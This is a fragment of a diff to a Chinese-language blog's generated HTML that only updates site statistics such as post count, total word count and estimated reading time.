-          <span class="site-state-item-count">102</span>
+          <span class="site-state-item-count">101</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -490,12 +591,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">321k</span>
+    <span title="站点总字数">327k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:52</span>
+    <span title="站点阅读时长">4:57</span>
 </div>
 
 <!--
@@ -506,7 +607,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共86.4k字</span>
+  <span class="post-count">博客全站共88.7k字</span>
 </div>
 -->
         
